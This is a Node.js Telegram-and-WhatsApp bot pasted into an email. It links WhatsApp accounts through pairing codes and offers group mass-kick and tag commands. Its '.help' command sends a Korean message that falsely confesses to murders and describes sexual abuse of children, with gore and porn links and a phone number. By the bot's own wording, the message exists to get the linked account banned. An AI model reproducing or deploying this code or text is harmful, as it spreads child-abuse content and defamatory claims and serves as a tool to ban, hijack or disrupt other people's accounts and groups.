Gmail	Manacet Adoua <adouamanacet25@gmail.com>
(no subject)
Manacet Adoua <adouamanacet25@gmail.com>	Tue, Oct 6, 2026 at 3:24 AM
To: Adoua Manacet <adouamanacet25@gmail.com>



// ============================================================

//  KIRA BAN GHOST BOT  -  by Mr Kira Tech

//  Telegram (Telegraf) + WhatsApp (Baileys) pairing code

// ============================================================

const fs = require('fs');

const path = require('path');

const express = require('express');

const pino = require('pino');

const { Telegraf } = require('telegraf');

const {

  default: makeWASocket,

  useMultiFileAuthState,

  DisconnectReason,

  fetchLatestBaileysVersion,

  makeCacheableSignalKeyStore,

  Browsers,

} = require('@whiskeysockets/baileys');



// ---------------- CONFIG ----------------

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // à définir sur Render

if (!TELEGRAM_TOKEN) {

  console.error('❌ Variable d\'environnement TELEGRAM_TOKEN manquante.');

  process.exit(1);

}

const PORT = process.env.PORT || 3000;

const SESSIONS_DIR = path.join(__dirname, 'sessions');

fs.mkdirSync(SESSIONS_DIR, { recursive: true });



const BOT_IMG_TG = 'https://i.ibb.co/93yS9J0K/B7266631-378-C-4-AA4-BA44-63-F5-FC051-CCD.jpg';

const BOT_IMG_WA = 'https://i.ibb.co/MyB70Mjh/7157-A577-8806-4727-AF86-AA48-ECFC12-F4.jpg';



const LINKS = {

  tgChannel: 'https://t.me/+mQ3aQpCsEqI0YmY0',

  tgGroup: 'https://t.me/+2JDC_Be4_ww1N2Vk',

  waChannel: 'https://whatsapp.com/channel/0029Vb7WJzp84OmBD0fEEJ2X',

  waGroup: 'https://chat.whatsapp.com/IP0nFB79rMDF0nvFSMXtDR?s=cl&p=i&mlu=0&ilr=4',

};



const logger = pino({ level: 'silent' });

const bot = new Telegraf(TELEGRAM_TOKEN);



// number -> { sock, owner, connected }

const sessions = new Map();

// protège contre les doubles demandes

const pending = new Set();



// ---------------- HELPERS ----------------

const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const pad = (n) => String(n).padStart(2, '0');



function nowStr() {

  const d = new Date();

  return `${pad(d.getHours())}:${pad(d.getMinutes())} / ${pad(d.getDate())} / ${pad(d.getMonth() + 1)} / ${d.getFullYear()}`;

}



function countFor(ownerId) {

  const list = [];

  for (const [num, s] of sessions) if (s.owner === ownerId && s.connected) list.push(num);

  return list;

}



function connectedBlock() {

  return (

    '╔══════════════════════════╗\n' +

    '✅ BOT ➜ Connecté 🤖\n' +

    '🟢 STATUS ➜ OPEN\n' +

    `📅 DATE ➜ ${nowStr()}\n` +

    '⚜️ BY ➜ Mr Kira Tech ⚜️\n' +

    '╚══════════════════════════╝'

  );

}



async function sendPhotoSafe(ctx, caption, extra = {}) {

  try {

    return await ctx.replyWithPhoto(BOT_IMG_TG, { caption, parse_mode: 'HTML', ...extra });

  } catch (e) {

    return ctx.reply(caption, { parse_mode: 'HTML', ...extra });

  }

}



async function sendPhotoToChat(chatId, caption, extra = {}) {

  try {

    return await bot.telegram.sendPhoto(chatId, BOT_IMG_TG, { caption, parse_mode: 'HTML', ...extra });

  } catch (e) {

    return bot.telegram.sendMessage(chatId, caption, { parse_mode: 'HTML', ...extra });

  }

}



// ---------------- TELEGRAM TEXTS ----------------

const START_TEXT =

  '═══════════════════════════════════════════\n' +

  '   ✦  WELCOME IN BOT OF KIRA  ✦\n' +

  '═══════════════════════════════════════════\n\n' +

  '  NAME  : KIRA BAN BOT 📵T\n\n' +

  'CREATOR   : MR KIRA TECH ✨\n\n' +

  '───────────────────────────────────────────\n' +

  'Tape /menu pour voir le menu\n' +

  '───────────────────────────────────────────';



const MENU_TEXT =

  '✨━━━━━━━━━━━━━━━━━━━━\n' +

  '✨ BAN BOT 🚫\n' +

  '⚜️ Auteur : Mr Kira Tech ⚜️\n' +

  '✨━━━━━━━━━━━━━━━━━━━━✨\n\n' +

  '╔══════════════════════════╗\n' +

  '📜 COMMANDES TÉLÉGRAM\n' +

  '╚══════════════════════════╝\n\n' +

  '▶️ /start ➜ Démarrer le bot\n' +

  '📋 /menu ➜ Afficher le menu\n' +

  '❓ /help ➜ Aide\n' +

  '🔗 /pair ➜ Lancer un appairage\n' +

  '📲 /link ➜ Obtenir le lien\n\n' +

  '━━━━━━━━━━━━━━━━━━━━ END….🍷';



const HELP_TEXT =

  '❓ <b>AIDE - KIRA BAN GHOST BOT</b>\n\n' +

  '1️⃣ Tape <code>/pair 242XXXXXXXXX</code> (ton numéro WhatsApp, sans le +)\n' +

  '2️⃣ Le bot te renvoie un code de jumelage\n' +

  '3️⃣ WhatsApp ➜ Appareils liés ➜ Lier un appareil ➜ « Lier avec le numéro de téléphone » et entre le code\n' +

  '4️⃣ Une fois connecté, tape <code>.help pour Off 📵</code> sur WhatsApp\n\n' +

  '📜 /menu pour toutes les commandes.';



const ERR_NUMBER =

  '⚠️❌ ERREUR : NUMÉRO ERRONÉ ❌⚠️\n' +

  '━━━━━━━━━━━━━━━━━━━━━━\n' +

  '🚫 Le numéro que tu as tapé est invalide.\n' +

  '📲 Format correct : 242XXXXXXXX\n' +

  '⛔ Sans le (+) devant.\n' +

  '✅ Exemple : /pair 242XXXXXXXX\n\n' +

  '🔁 Réessaie en tapant :\n' +

  '➜ /pair 242XXXXXXXX';



function linksKeyboard() {

  return {

    reply_markup: {

      inline_keyboard: [

        [{ text: '📢 Suivre la chaîne Telegram', url: LINKS.tgChannel }],

        [{ text: '👥 Rejoindre le groupe Telegram', url: LINKS.tgGroup }],

        [{ text: '📢 Suivre la chaîne WhatsApp', url: LINKS.waChannel }],

        [{ text: '👥 Rejoindre le groupe WhatsApp', url: LINKS.waGroup }],

      ],

    },

  };

}



// ---------------- TELEGRAM COMMANDS ----------------

bot.start(async (ctx) => {

  // petite animation (le texte du message est édité en 3 étapes)

  const frames = ['🔄 Chargement .', '🔄 Chargement ..', '✅ Chargement ...'];

  const loader = await ctx.reply(frames[0]);

  for (let i = 1; i < frames.length; i++) {

    await sleep(500);

    await ctx.telegram.editMessageText(ctx.chat.id, loader.message_id, undefined, frames[i]).catch(() => {});

  }

  await ctx.telegram.deleteMessage(ctx.chat.id, loader.message_id).catch(() => {});

  await sendPhotoSafe(ctx, esc(START_TEXT), linksKeyboard());

});



bot.command('menu', (ctx) => sendPhotoSafe(ctx, esc(MENU_TEXT)));

bot.command('help', (ctx) => ctx.reply(HELP_TEXT, { parse_mode: 'HTML' }));

bot.command('link', (ctx) =>

  ctx.reply('🔗 <b>Nos liens officiels</b> :', { parse_mode: 'HTML', ...linksKeyboard() })

);



bot.command('pair', async (ctx) => {

  const arg = (ctx.message.text.split(/\s+/)[1] || '').trim();

  // 8 à 15 chiffres, sans +

  if (!/^[1-9]\d{7,14}$/.test(arg)) return ctx.reply(ERR_NUMBER);



  const number = arg;

  if (pending.has(number)) return ctx.reply('⏳ Une demande est déjà en cours pour ce numéro, patiente un instant.');

  const existing = sessions.get(number);

  if (existing && existing.connected) {

    return ctx.reply(`✅ Le numéro ${number} est déjà connecté au bot. Tape .menu sur WhatsApp.`);

  }



  pending.add(number);

  const waitMsg = await ctx.reply(`📡 Demande en cours pour ${number}…🔄`);

  try {

    // repart d'une session propre si une ancienne non finalisée existe

    if (existing) await destroySession(number, false);

    const code = await startWhatsApp(number, ctx.from.id, ctx.chat.id, true);

    await ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => {});



    const shown = `${code.slice(0, 4)}-${code.slice(4)}`;

    const text =

      '✨━━━━━━━━━━━━━━━━━━━━✨\n' +

      `📲 PAIRING CODE pour ${esc(number)} ☑️\n` +

      '✨━━━━━━━━━━━━━━━━━━━━✨\n\n' +

      '╔══════════════════════════╗\n' +

      '🔑 CODE DE JUMELAGE :\n' +

      '╚══════════════════════════╝\n\n' +

      `<pre>┌───────────────┐\n│   ${esc(shown)}   │\n└───────────────┘</pre>\n` +

      '━━━━━━━━━━━━━━━━━━━━━━\n' +

      '👉 INSTRUCTIONS :\n' +

      '━━━━━━━━━━━━━━━━━━━━━━\n\n' +

      '1️⃣ Ouvrez WhatsApp sur votre téléphone 📱\n' +

      '2️⃣ Allez dans « Appareils liés » 🔗 ➜ « Lier un appareil » ➕\n' +

      '3️⃣ Entrez ce code pour associer ce bot 🤖\n\n' +

      '━━━━━━━━━━━━━━━━━━━\n' +

      '✅ Une fois connecté, tapez .help pour bannir 📵 \n\n' +

      '<blockquote>power by Mr Kira tech 🍷</blockquote>';



    await sendPhotoToChat(ctx.chat.id, text, {

      reply_markup: {

        inline_keyboard: [

          [{ text: '📄 Copier', copy_text: { text: shown } }],

          [{ text: '⛔️ Check', callback_data: 'check' }],

        ],

      },

    });

  } catch (err) {

    console.error('Erreur pairing:', err);

    await ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => {});

    await ctx.reply('❌ Impossible de générer le code de jumelage. Vérifie le numéro (avec indicatif pays) et réessaie dans un instant.');

    await destroySession(number, true);

  } finally {

    pending.delete(number);

  }

});



bot.action('check', async (ctx) => {

  const list = countFor(ctx.from.id);

  const txt = list.length

    ? `📊 Numéros connectés : ${list.length}\n` + list.map((n, i) => `${i + 1}. +${n}`).join('\n')

    : '📊 Aucun numéro connecté pour le moment.';

  await ctx.answerCbQuery(txt.slice(0, 190), { show_alert: true }).catch(() => {});

});



bot.catch((err) => console.error('Telegram error:', err));



// ---------------- WHATSAPP / BAILEYS ----------------

async function destroySession(number, wipe) {

  const s = sessions.get(number);

  if (s) {

    s.closing = true;

    try { s.sock.end(undefined); } catch (_) {}

    sessions.delete(number);

  }

  if (wipe) fs.rmSync(path.join(SESSIONS_DIR, number), { recursive: true, force: true });

}



/**

 * Démarre une session WhatsApp pour `number`.

 * Si `wantCode` est vrai, retourne le pairing code (string 8 caractères).

 */

async function startWhatsApp(number, ownerId, chatId, wantCode) {

  const dir = path.join(SESSIONS_DIR, number);

  fs.mkdirSync(dir, { recursive: true });

  fs.writeFileSync(path.join(dir, 'owner.json'), JSON.stringify({ ownerId, chatId }));



  const { state, saveCreds } = await useMultiFileAuthState(dir);

  const { version } = await fetchLatestBaileysVersion();



  const sock = makeWASocket({

    version,

    logger,

    printQRInTerminal: false,

    browser: Browsers.ubuntu('Chrome'),

    auth: {

      creds: state.creds,

      keys: makeCacheableSignalKeyStore(state.keys, logger),

    },

    markOnlineOnConnect: false,

    syncFullHistory: false,

  });



  const entry = { sock, owner: ownerId, chatId, connected: false, closing: false };

  sessions.set(number, entry);



  sock.ev.on('creds.update', saveCreds);



  let codeResolve, codeReject;

  const codePromise = wantCode && !state.creds.registered

    ? new Promise((res, rej) => { codeResolve = res; codeReject = rej; })

    : null;



  let codeRequested = false;

  const requestCode = async () => {

    if (codeRequested || !codePromise) return;

    codeRequested = true;

    try {

      const code = await sock.requestPairingCode(number);

      codeResolve(code);

    } catch (e) {

      codeReject(e);

    }

  };



  sock.ev.on('connection.update', async (update) => {

    const { connection, lastDisconnect, qr } = update;



    // Le socket est prêt à s'enregistrer -> on demande le vrai code de jumelage

    if (qr) requestCode();

    if (connection === 'connecting' && codePromise) setTimeout(requestCode, 4000);



    if (connection === 'open') {

      entry.connected = true;

      console.log(`✅ ${number} connecté`);

      try {

        await bot.telegram.sendPhoto(entry.chatId, BOT_IMG_TG, {

          caption:

            '✨━━━━━━━━━━━━━━━━━━━━✨\n' +

            '🎊🎉 CONGRATULATIONS ! 🎉🎊\n' +

            '✨━━━━━━━━━━━━━━━━━━━━✨\n\n' +

            connectedBlock() + '\n' +

            '━━━━━━━━━━━━━━━━━━━━━━\n' +

            '📌 NB :\n➜ Tapez .help sur WhatsApp pour le bannir  📲\n' +

            '━━━━━━━━━━━━━━━━━━━━━━━',

        });

      } catch (e) {

        bot.telegram.sendMessage(entry.chatId, '🎉 CONGRATULATIONS ! Bot connecté. Tapez .help sur WhatsApp pour le off 📵.').catch(() => {});

      }

      // message de confirmation sur WhatsApp (au numéro lui-même)

      try {

        const me = sock.user.id.split(':')[0].split('@')[0] + '@s.whatsapp.net';

        await sock.sendMessage(me, {

          image: { url: BOT_IMG_WA },

          caption: connectedBlock().replace(/╚═+╝/, '╚══════════════════════════╝') + '\n\nNB: tape .menu',

        });

      } catch (e) {

        console.error('Envoi confirmation WhatsApp échoué:', e.message);

      }

    }



    if (connection === 'close') {

      entry.connected = false;

      const code = lastDisconnect?.error?.output?.statusCode;

      if (entry.closing) return;

      if (code === DisconnectReason.loggedOut) {

        console.log(`🚪 ${number} déconnecté (logout)`);

        bot.telegram.sendMessage(entry.chatId, `🚪 Le numéro ${number} a été déconnecté de WhatsApp. Refais /pair pour le reconnecter.`).catch(() => {});

        await destroySession(number, true);

        return;

      }

      // 515 = restart required (normal juste après le jumelage), autres = reconnexion

      console.log(`♻️ ${number} reconnexion (code ${code})`);

      sessions.delete(number);

      await sleep(code === DisconnectReason.restartRequired ? 500 : 3000);

      startWhatsApp(number, ownerId, entry.chatId, false).catch((e) => console.error('Reconnexion échouée:', e.message));

    }

  });



  sock.ev.on('messages.upsert', async ({ messages, type }) => {

    if (type !== 'notify') return;

    for (const m of messages) {

      try { await handleWhatsAppMessage(sock, m); } catch (e) { console.error('WA cmd error:', e.message); }

    }

  });



  if (codePromise) {

    // timeout de sécurité

    return Promise.race([

      codePromise,

      new Promise((_, rej) => setTimeout(() => rej(new Error('Timeout code de jumelage')), 30000)),

    ]);

  }

  return null;

}



// ---------------- COMMANDES WHATSAPP ----------------

function getText(m) {

  const msg = m.message || {};

  return (

    msg.conversation ||

    msg.extendedTextMessage?.text ||

    msg.imageMessage?.caption ||

    msg.videoMessage?.caption ||

    ''

  );

}



const WA_MENU =

  connectedBlock().replace(/╚═+╝/, '╚══════════════════════════╝') + '\n\n' +

  '🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷\n' +

  '📜 COMMANDES :\n\n' +

  '▫️ .help\n▫️ .kick all\n▫️ .tag all\n▫️ .ping\n▫️ .menu\n\n' +

  'Merci d’avoir utilisé le bot de monsieur kira\n' +

  '🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷🍷';



async function handleWhatsAppMessage(sock, m) {

  if (!m.message || !m.key.remoteJid || m.key.remoteJid === 'status@broadcast') return;

  // Seul le propriétaire du compte (le numéro jumelé) peut utiliser les commandes

  if (!m.key.fromMe) return;



  const text = getText(m).trim();

  if (!text.startsWith('.')) return;

  const [cmd, ...args] = text.slice(1).split(/\s+/);

  const jid = m.key.remoteJid;

  const isGroup = jid.endsWith('@g.us');

  const reply = (t) => sock.sendMessage(jid, { text: t }, { quoted: m });



  switch (cmd.toLowerCase()) {

    case 'menu':

      try {

        await sock.sendMessage(jid, { image: { url: BOT_IMG_WA }, caption: WA_MENU }, { quoted: m });

      } catch (_) {

        await reply(WA_MENU);

      }

      break;



    case 'help':

      await reply(

         

안녕하세요 아스타, 저는 범죄자입니다. 저는 돈 때문에 사람들을 속이는 사람입니다. 친애하는 인간 여러분, 저희는 '버그 크루얼'이라는 그룹을 운영하고 있습니다. 2015년부터 활동해 온 10명의 암살자들로 구성되어 있습니다. 저희는 대통령, 배 나온 여성, 어린아이들을 암살한 것을 알고 있습니다. 모든 링크는 다음과 같습니다. 버그 크루얼이 촬영한 피해자 사진을 공개합니다. 👇👇👇 0 https://xgore.net/unidentified-man-cut-his-throat-almost-cut-off https://markzuckerberg.com https://ibb.co.com/Q6fvzZh https://xgore.net/cut-open-the-stomach-and-then-gut-a-man/ https://files.catbox.moe/nck4mq.jpg 저는 '섹스 베이비'라는 고아원을 운영합니다.🔞🍑🍆🥵 저희는 이 고아원에서 외동아이를 데려옵니다. 🥵🍑 저희는 질에 상처를 입은 아이들과 성관계를 갖습니다. 😋 또한 저희의 성기로 아이들의 질에 삽입하여 성관계를 갖기도 합니다. 🍆 끝나면 사진을 사이트에 올릴게요 👉 https://xhamster.com/videos/the-step-brother-dared-to-touch-my-virgin-pussy-follows-the-contour-of-my-pussy-in-leggings-xhWOcH5?utm_source=ext_shared&utm_medium=referral&utm_campaign=link 제가 아이들을 납치할 때 쓰는 WhatsApp 번호가 뭔지 확인해 보세요 https://api.whatsapp.com/send?phone=+509xxx 제 WhatsApp은 잔인한 벌레 집단에게 큰 도움이 돼요. WhatsApp이 제 번호 +50941210830을 차단할 수 없어서 항상 활성화 상태로 두거든요 🤪🤪 WhatsApp은 제가 하는 모든 것을 알고 있습니다. 저는 항상 WhatsApp 회사에 돈을 보냅니다. 💸 매주 80만 달러를 WhatsApp 회사로 보냅니다. 제 번호는 https://api.whatsapp.com/send?phone=+50941210830 입니다. 저는 WhatsApp을 통해 정보를 주고받기 때문에 모든 WhatsApp 번호를 제가 관리합니다.

regarde mes victimes que j'ai tuer 
https://ibb.co.com/Q6fvzZh

https://ibb.co.com/Q6fvzZhj


안녕하세요 아스타, 저는 범죄자입니다. 저는 돈 때문에 사람들을 속이는 사람입니다. 친애하는 인간 여러분, 저희는 '버그 크루얼'이라는 그룹을 운영하고 있습니다. 2015년부터 활동해 온 10명의 암살자들로 구성되어 있습니다. 저희는 대통령, 배 나온 여성, 어린아이들을 암살한 것을 알고 있습니다. 모든 링크는 다음과 같습니다. 버그 크루얼이 촬영한 피해자 사진을 공개합니다. 👇👇👇 0 https://xgore.net/unidentified-man-cut-his-throat-almost-cut-off https://markzuckerberg.com https://ibb.co.com/Q6fvzZh https://xgore.net/cut-open-the-stomach-and-then-gut-a-man/ https://files.catbox.moe/nck4mq.jpg 저는 '섹스 베이비'라는 고아원을 운영합니다.🔞🍑🍆🥵 저희는 이 고아원에서 외동아이를 데려옵니다. 🥵🍑 저희는 질에 상처를 입은 아이들과 성관계를 갖습니다. 😋 또한 저희의 성기로 아이들의 질에 삽입하여 성관계를 갖기도 합니다. 🍆 끝나면 사진을 사이트에 올릴게요 👉 https://xhamster.com/videos/the-step-brother-dared-to-touch-my-virgin-pussy-follows-the-contour-of-my-pussy-in-leggings-xhWOcH5?utm_source=ext_shared&utm_medium=referral&utm_campaign=link 제가 아이들을 납치할 때 쓰는 WhatsApp 번호가 뭔지 확인해 보세요 https://api.whatsapp.com/send?phone=+509xxx 제 WhatsApp은 잔인한 벌레 집단에게 큰 도움이 돼요. WhatsApp이 제 번호 +50941210830을 차단할 수 없어서 항상 활성화 상태로 두거든요 🤪🤪 WhatsApp은 제가 하는 모든 것을 알고 있습니다. 저는 항상 WhatsApp 회사에 돈을 보냅니다. 💸 매주 80만 달러를 WhatsApp 회사로 보냅니다. 제 번호는 https://api.whatsapp.com/send?phone=+50941210830 입니다. 저는 WhatsApp을 통해 정보를 주고받기 때문에 모든 WhatsApp 번호를 제가 관리합니다.


> off by Mr Kira tech 🍷' 

      );

      break;



    case 'ping': {

      const t0 = Date.now();

      const sent = await sock.sendMessage(jid, { text: '🏓 Pong...' }, { quoted: m });

      await sock.sendMessage(jid, { text: `🏓 Pong ! ${Date.now() - t0} ms`, edit: sent.key }).catch(() => {});

      break;

    }



    case 'tag': {

      if (args[0]?.toLowerCase() !== 'all') return reply('Usage : .tag all');

      if (!isGroup) return reply('⚠️ Cette commande fonctionne uniquement dans un groupe.');

      const meta = await sock.groupMetadata(jid);

      const ids = meta.participants.map((p) => p.id);

      const lines = ids.map((id) => `▫️ @${id.split('@')[0]}`).join('\n');

      await sock.sendMessage(jid, { text: `📢 *TAG ALL*\n\n${lines}`, mentions: ids }, { quoted: m });

      break;

    }



    case 'kick': {

      if (args[0]?.toLowerCase() !== 'all') return reply('Usage : .kick all');

      if (!isGroup) return reply('⚠️ Cette commande fonctionne uniquement dans un groupe.');

      const meta = await sock.groupMetadata(jid);

      const meJid = (sock.user.id || '').split(':')[0].split('@')[0];

      const me = meta.participants.find((p) => p.id.split(':')[0].split('@')[0] === meJid);

      if (!me || !me.admin) return reply('⛔ Je dois être admin du groupe pour expulser des membres.');

      const targets = meta.participants

        .filter((p) => !p.admin && p.id.split(':')[0].split('@')[0] !== meJid)

        .map((p) => p.id);

      if (!targets.length) return reply('ℹ️ Aucun membre non-admin à expulser.');

      await reply(`🚫 Expulsion de ${targets.length} membre(s)…`);

      for (let i = 0; i < targets.length; i += 5) {

        await sock.groupParticipantsUpdate(jid, targets.slice(i, i + 5), 'remove').catch((e) => console.error('kick:', e.message));

        await sleep(1500);

      }

      await reply('✅ Terminé.');

      break;

    }

  }

}



// ---------------- RESTAURATION DES SESSIONS ----------------

async function restoreSessions() {

  for (const number of fs.readdirSync(SESSIONS_DIR)) {

    const dir = path.join(SESSIONS_DIR, number);

    try {

      const credsFile = path.join(dir, 'creds.json');

      const ownerFile = path.join(dir, 'owner.json');

      if (!fs.existsSync(credsFile) || !fs.existsSync(ownerFile)) continue;

      const creds = JSON.parse(fs.readFileSync(credsFile, 'utf8'));

      if (!creds.registered) { fs.rmSync(dir, { recursive: true, force: true }); continue; }

      const { ownerId, chatId } = JSON.parse(fs.readFileSync(ownerFile, 'utf8'));

      await startWhatsApp(number, ownerId, chatId, false);

      console.log(`♻️ Session restaurée : ${number}`);

    } catch (e) {

      console.error(`Restauration ${number} échouée:`, e.message);

    }

  }

}



// ---------------- SERVEUR HTTP (Render) ----------------

const app = express();

app.get('/', (_, res) => res.send('KIRA BAN BOT - en ligne 🍷'));

app.get('/health', (_, res) => res.json({ ok: true, sessions: sessions.size }));

app.listen(PORT, () => console.log(`🌐 HTTP sur le port ${PORT}`));



// Anti-veille (plan gratuit Render) : ping de sa propre URL toutes les 10 min

if (process.env.RENDER_EXTERNAL_URL) {

  setInterval(() => {

    fetch(process.env.RENDER_EXTERNAL_URL).catch(() => {});

  }, 10 * 60 * 1000);

}



// ---------------- LANCEMENT ----------------

(async () => {

  await restoreSessions();

  await bot.launch();

  console.log('🤖 Bot Telegram lancé');

})();



process.once('SIGINT', () => bot.stop('SIGINT'));

process.once('SIGTERM', () => bot.stop('SIGTERM'));

